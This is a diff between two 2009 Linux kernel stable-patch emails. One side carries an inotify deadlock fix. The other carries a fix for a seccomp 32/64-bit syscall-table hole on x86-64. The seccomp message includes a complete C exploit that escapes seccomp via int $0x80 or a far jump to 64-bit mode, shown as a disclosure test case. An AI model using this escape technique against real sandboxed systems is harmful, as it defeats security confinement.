@@ -1,18 +1,18 @@
-Return-Path: <linux-kernel-owner+w=401wt.eu-S1753607AbZCNAbx@vger.kernel.org>
+Return-Path: <linux-kernel-owner+w=401wt.eu-S1755752AbZCNAm2@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1753607AbZCNAbx (ORCPT <rfc822;w@1wt.eu>);
-	Fri, 13 Mar 2009 20:31:53 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1753491AbZCNATI
+	id S1755752AbZCNAm2 (ORCPT <rfc822;w@1wt.eu>);
+	Fri, 13 Mar 2009 20:42:28 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1753692AbZCNATl
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Fri, 13 Mar 2009 20:19:08 -0400
-Received: from kroah.org ([198.145.64.141]:47022 "EHLO coco.kroah.org"
+	Fri, 13 Mar 2009 20:19:41 -0400
+Received: from kroah.org ([198.145.64.141]:34889 "EHLO coco.kroah.org"
 	rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-	id S1753465AbZCNATA (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Fri, 13 Mar 2009 20:19:00 -0400
-X-Mailbox-Line: From gregkh@mini.kroah.org Fri Mar 13 17:07:45 2009
-Message-Id: <20090314000745.022590080@mini.kroah.org>
+	id S1753712AbZCNAT3 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Fri, 13 Mar 2009 20:19:29 -0400
+X-Mailbox-Line: From gregkh@mini.kroah.org Fri Mar 13 17:07:49 2009
+Message-Id: <20090314000749.340243504@mini.kroah.org>
 User-Agent: quilt/0.48-1
-Date: Fri, 13 Mar 2009 17:05:48 -0700
+Date: Fri, 13 Mar 2009 17:06:16 -0700
 From: Greg KH <gregkh@suse.de>
 To: linux-kernel@vger.kernel.org, stable@kernel.org
 Cc: Justin Forbes <jmforbes@linuxtx.org>,
@@ -25,13 +25,10 @@ Cc: Justin Forbes <jmforbes@linuxtx.org>,
        Rodrigo Rubira Branco <rbranco@la.checkpoint.com>,
        Jake Edge <jake@lwn.net>, Eugene Teo <eteo@redhat.com>,
        torvalds@linux-foundation.org, akpm@linux-foundation.org,
-       alan@lxorguk.ukuu.org.uk, Ingo Molnar <mingo@elte.hu>,
-       Peter Zijlstra <a.p.zijlstra@chello.nl>,
-       MinChan Kim <minchan.kim@gmail.com>,
-       Nick Piggin <nickpiggin@yahoo.com.au>
-Subject: [patch 40/96] inotify: fix GFP_KERNEL related deadlock
+       alan@lxorguk.ukuu.org.uk, Roland McGrath <roland@redhat.com>
+Subject: [patch 68/96] x86-64: seccomp: fix 32/64 syscall hole
 References: <20090314000508.803142980@mini.kroah.org>
-Content-Disposition: inline; filename=inotify-fix-gfp_kernel-related-deadlock.patch
+Content-Disposition: inline; filename=x86-64-seccomp-fix-32-64-syscall-hole.patch
 In-Reply-To: <20090314001449.GA4485@kroah.com>
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
@@ -41,96 +38,221 @@ X-Mailing-List: linux-kernel@vger.kernel.org
 
 ------------------
 
-From: Ingo Molnar <mingo@elte.hu>
+From: Roland McGrath <roland@redhat.com>
 
-commit f04b30de3c82528f1ab4c58b3dd4c975f5341901 upstream.
+commit 5b1017404aea6d2e552e991b3fd814d839e9cd67 upstream.
 
-Enhanced lockdep coverage of __GFP_NOFS turned up this new lockdep
-assert:
+On x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with
+ljmp, and then use the "syscall" instruction to make a 64-bit system
+call.  A 64-bit process make a 32-bit system call with int $0x80.
 
-[ 1093.677775]
-[ 1093.677781] =================================
-[ 1093.680031] [ INFO: inconsistent lock state ]
-[ 1093.680031] 2.6.29-rc5-tip-01504-gb49eca1-dirty #1
-[ 1093.680031] ---------------------------------
-[ 1093.680031] inconsistent {RECLAIM_FS-ON-W} -> {IN-RECLAIM_FS-W} usage.
-[ 1093.680031] kswapd0/308 [HC0[0]:SC0[0]:HE1:SE1] takes:
-[ 1093.680031]  (&inode->inotify_mutex){+.+.?.}, at: [<c0205942>] inotify_inode_is_dead+0x20/0x80
-[ 1093.680031] {RECLAIM_FS-ON-W} state was registered at:
-[ 1093.680031]   [<c01696b9>] mark_held_locks+0x43/0x5b
-[ 1093.680031]   [<c016baa4>] lockdep_trace_alloc+0x6c/0x6e
-[ 1093.680031]   [<c01cf8b0>] kmem_cache_alloc+0x20/0x150
-[ 1093.680031]   [<c040d0ec>] idr_pre_get+0x27/0x6c
-[ 1093.680031]   [<c02056e3>] inotify_handle_get_wd+0x25/0xad
-[ 1093.680031]   [<c0205f43>] inotify_add_watch+0x7a/0x129
-[ 1093.680031]   [<c020679e>] sys_inotify_add_watch+0x20f/0x250
-[ 1093.680031]   [<c010389e>] sysenter_do_call+0x12/0x35
-[ 1093.680031]   [<ffffffff>] 0xffffffff
-[ 1093.680031] irq event stamp: 60417
-[ 1093.680031] hardirqs last  enabled at (60417): [<c018d5f5>] call_rcu+0x53/0x59
-[ 1093.680031] hardirqs last disabled at (60416): [<c018d5b9>] call_rcu+0x17/0x59
-[ 1093.680031] softirqs last  enabled at (59656): [<c0146229>] __do_softirq+0x157/0x16b
-[ 1093.680031] softirqs last disabled at (59651): [<c0106293>] do_softirq+0x74/0x15d
-[ 1093.680031]
-[ 1093.680031] other info that might help us debug this:
-[ 1093.680031] 2 locks held by kswapd0/308:
-[ 1093.680031]  #0:  (shrinker_rwsem){++++..}, at: [<c01b0502>] shrink_slab+0x36/0x189
-[ 1093.680031]  #1:  (&type->s_umount_key#4){+++++.}, at: [<c01e6d77>] shrink_dcache_memory+0x110/0x1fb
-[ 1093.680031]
-[ 1093.680031] stack backtrace:
-[ 1093.680031] Pid: 308, comm: kswapd0 Not tainted 2.6.29-rc5-tip-01504-gb49eca1-dirty #1
-[ 1093.680031] Call Trace:
-[ 1093.680031]  [<c016947a>] valid_state+0x12a/0x13d
-[ 1093.680031]  [<c016954e>] mark_lock+0xc1/0x1e9
-[ 1093.680031]  [<c016a5b4>] ? check_usage_forwards+0x0/0x3f
-[ 1093.680031]  [<c016ab74>] __lock_acquire+0x2c6/0xac8
-[ 1093.680031]  [<c01688d9>] ? register_lock_class+0x17/0x228
-[ 1093.680031]  [<c016b3d3>] lock_acquire+0x5d/0x7a
-[ 1093.680031]  [<c0205942>] ? inotify_inode_is_dead+0x20/0x80
-[ 1093.680031]  [<c08824c4>] __mutex_lock_common+0x3a/0x4cb
-[ 1093.680031]  [<c0205942>] ? inotify_inode_is_dead+0x20/0x80
-[ 1093.680031]  [<c08829ed>] mutex_lock_nested+0x2e/0x36
-[ 1093.680031]  [<c0205942>] ? inotify_inode_is_dead+0x20/0x80
-[ 1093.680031]  [<c0205942>] inotify_inode_is_dead+0x20/0x80
-[ 1093.680031]  [<c01e6672>] dentry_iput+0x90/0xc2
-[ 1093.680031]  [<c01e67a3>] d_kill+0x21/0x45
-[ 1093.680031]  [<c01e6a46>] __shrink_dcache_sb+0x27f/0x355
-[ 1093.680031]  [<c01e6dc5>] shrink_dcache_memory+0x15e/0x1fb
-[ 1093.680031]  [<c01b05ed>] shrink_slab+0x121/0x189
-[ 1093.680031]  [<c01b0d12>] kswapd+0x39f/0x561
-[ 1093.680031]  [<c01ae499>] ? isolate_pages_global+0x0/0x233
-[ 1093.680031]  [<c0157eae>] ? autoremove_wake_function+0x0/0x43
-[ 1093.680031]  [<c01b0973>] ? kswapd+0x0/0x561
-[ 1093.680031]  [<c0157daf>] kthread+0x41/0x82
-[ 1093.680031]  [<c0157d6e>] ? kthread+0x0/0x82
-[ 1093.680031]  [<c01043ab>] kernel_thread_helper+0x7/0x10
+In both these cases under CONFIG_SECCOMP=y, secure_computing() will use
+the wrong system call number table.  The fix is simple: test TS_COMPAT
+instead of TIF_IA32.  Here is an example exploit:
 
-inotify_handle_get_wd() does idr_pre_get() which does a
-kmem_cache_alloc() without __GFP_FS - and is hence deadlockable under
-extreme MM pressure.
+	/* test case for seccomp circumvention on x86-64
 
-Signed-off-by: Ingo Molnar <mingo@elte.hu>
-Acked-by: Peter Zijlstra <a.p.zijlstra@chello.nl>
-Cc: MinChan Kim <minchan.kim@gmail.com>
-Cc: Nick Piggin <nickpiggin@yahoo.com.au>
-Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
+	   There are two failure modes: compile with -m64 or compile with -m32.
+
+	   The -m64 case is the worst one, because it does "chmod 777 ." (could
+	   be any chmod call).  The -m32 case demonstrates it was able to do
+	   stat(), which can glean information but not harm anything directly.
+
+	   A buggy kernel will let the test do something, print, and exit 1; a
+	   fixed kernel will make it exit with SIGKILL before it does anything.
+	*/
+
+	#define _GNU_SOURCE
+	#include <assert.h>
+	#include <inttypes.h>
+	#include <stdio.h>
+	#include <linux/prctl.h>
+	#include <sys/stat.h>
+	#include <unistd.h>
+	#include <asm/unistd.h>
+
+	int
+	main (int argc, char **argv)
+	{
+	  char buf[100];
+	  static const char dot[] = ".";
+	  long ret;
+	  unsigned st[24];
+
+	  if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)
+	    perror ("prctl(PR_SET_SECCOMP) -- not compiled into kernel?");
+
+	#ifdef __x86_64__
+	  assert ((uintptr_t) dot < (1UL << 32));
+	  asm ("int $0x80 # %0 <- %1(%2 %3)"
+	       : "=a" (ret) : "0" (15), "b" (dot), "c" (0777));
+	  ret = snprintf (buf, sizeof buf,
+			  "result %ld (check mode on .!)\n", ret);
+	#elif defined __i386__
+	  asm (".code32\n"
+	       "pushl %%cs\n"
+	       "pushl $2f\n"
+	       "ljmpl $0x33, $1f\n"
+	       ".code64\n"
+	       "1: syscall # %0 <- %1(%2 %3)\n"
+	       "lretl\n"
+	       ".code32\n"
+	       "2:"
+	       : "=a" (ret) : "0" (4), "D" (dot), "S" (&st));
+	  if (ret == 0)
+	    ret = snprintf (buf, sizeof buf,
+			    "stat . -> st_uid=%u\n", st[7]);
+	  else
+	    ret = snprintf (buf, sizeof buf, "result %ld\n", ret);
+	#else
+	# error "not this one"
+	#endif
+
+	  write (1, buf, ret);
+
+	  syscall (__NR_exit, 1);
+	  return 2;
+	}
+
+Signed-off-by: Roland McGrath <roland@redhat.com>
+[ I don't know if anybody actually uses seccomp, but it's enabled in
+  at least both Fedora and SuSE kernels, so maybe somebody is. - Linus ]
 Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
 Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>
 
 ---
- fs/inotify.c |    2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
+ arch/powerpc/include/asm/compat.h  |    5 +++++
+ arch/powerpc/include/asm/seccomp.h |    4 ----
+ arch/sparc/include/asm/compat.h    |    5 +++++
+ arch/sparc/include/asm/seccomp.h   |    6 ------
+ include/asm-mips/seccomp.h         |    1 -
+ include/asm-x86/seccomp_32.h       |    6 ------
+ include/asm-x86/seccomp_64.h       |    8 --------
+ kernel/seccomp.c                   |    7 ++++---
+ 8 files changed, 14 insertions(+), 28 deletions(-)
 
---- a/fs/inotify.c
-+++ b/fs/inotify.c
-@@ -156,7 +156,7 @@ static int inotify_handle_get_wd(struct 
- 	int ret;
+--- a/arch/powerpc/include/asm/compat.h
++++ b/arch/powerpc/include/asm/compat.h
+@@ -210,5 +210,10 @@ struct compat_shmid64_ds {
+ 	compat_ulong_t __unused6;
+ };
  
- 	do {
--		if (unlikely(!idr_pre_get(&ih->idr, GFP_KERNEL)))
-+		if (unlikely(!idr_pre_get(&ih->idr, GFP_NOFS)))
- 			return -ENOSPC;
- 		ret = idr_get_new_above(&ih->idr, watch, ih->last_wd+1, &watch->wd);
- 	} while (ret == -EAGAIN);
++static inline int is_compat_task(void)
++{
++	return test_thread_flag(TIF_32BIT);
++}
++
+ #endif /* __KERNEL__ */
+ #endif /* _ASM_POWERPC_COMPAT_H */
+--- a/arch/powerpc/include/asm/seccomp.h
++++ b/arch/powerpc/include/asm/seccomp.h
+@@ -1,10 +1,6 @@
+ #ifndef _ASM_POWERPC_SECCOMP_H
+ #define _ASM_POWERPC_SECCOMP_H
+ 
+-#ifdef __KERNEL__
+-#include <linux/thread_info.h>
+-#endif
+-
+ #include <linux/unistd.h>
+ 
+ #define __NR_seccomp_read __NR_read
+--- a/arch/sparc/include/asm/compat.h
++++ b/arch/sparc/include/asm/compat.h
+@@ -240,4 +240,9 @@ struct compat_shmid64_ds {
+ 	unsigned int	__unused2;
+ };
+ 
++static inline int is_compat_task(void)
++{
++	return test_thread_flag(TIF_32BIT);
++}
++
+ #endif /* _ASM_SPARC64_COMPAT_H */
+--- a/arch/sparc/include/asm/seccomp.h
++++ b/arch/sparc/include/asm/seccomp.h
+@@ -1,11 +1,5 @@
+ #ifndef _ASM_SECCOMP_H
+ 
+-#include <linux/thread_info.h> /* already defines TIF_32BIT */
+-
+-#ifndef TIF_32BIT
+-#error "unexpected TIF_32BIT on sparc64"
+-#endif
+-
+ #include <linux/unistd.h>
+ 
+ #define __NR_seccomp_read __NR_read
+--- a/include/asm-mips/seccomp.h
++++ b/include/asm-mips/seccomp.h
+@@ -1,6 +1,5 @@
+ #ifndef __ASM_SECCOMP_H
+ 
+-#include <linux/thread_info.h>
+ #include <linux/unistd.h>
+ 
+ #define __NR_seccomp_read __NR_read
+--- a/include/asm-x86/seccomp_32.h
++++ b/include/asm-x86/seccomp_32.h
+@@ -1,12 +1,6 @@
+ #ifndef _ASM_SECCOMP_H
+ #define _ASM_SECCOMP_H
+ 
+-#include <linux/thread_info.h>
+-
+-#ifdef TIF_32BIT
+-#error "unexpected TIF_32BIT on i386"
+-#endif
+-
+ #include <linux/unistd.h>
+ 
+ #define __NR_seccomp_read __NR_read
+--- a/include/asm-x86/seccomp_64.h
++++ b/include/asm-x86/seccomp_64.h
+@@ -1,14 +1,6 @@
+ #ifndef _ASM_SECCOMP_H
+ #define _ASM_SECCOMP_H
+ 
+-#include <linux/thread_info.h>
+-
+-#ifdef TIF_32BIT
+-#error "unexpected TIF_32BIT on x86_64"
+-#else
+-#define TIF_32BIT TIF_IA32
+-#endif
+-
+ #include <linux/unistd.h>
+ #include <asm/ia32_unistd.h>
+ 
+--- a/kernel/seccomp.c
++++ b/kernel/seccomp.c
+@@ -8,6 +8,7 @@
+ 
+ #include <linux/seccomp.h>
+ #include <linux/sched.h>
++#include <linux/compat.h>
+ 
+ /* #define SECCOMP_DEBUG 1 */
+ #define NR_SECCOMP_MODES 1
+@@ -22,7 +23,7 @@ static int mode1_syscalls[] = {
+ 	0, /* null terminated */
+ };
+ 
+-#ifdef TIF_32BIT
++#ifdef CONFIG_COMPAT
+ static int mode1_syscalls_32[] = {
+ 	__NR_seccomp_read_32, __NR_seccomp_write_32, __NR_seccomp_exit_32, __NR_seccomp_sigreturn_32,
+ 	0, /* null terminated */
+@@ -37,8 +38,8 @@ void __secure_computing(int this_syscall
+ 	switch (mode) {
+ 	case 1:
+ 		syscall = mode1_syscalls;
+-#ifdef TIF_32BIT
+-		if (test_thread_flag(TIF_32BIT))
++#ifdef CONFIG_COMPAT
++		if (is_compat_task())
+ 			syscall = mode1_syscalls_32;
+ #endif
+ 		do {
 
 
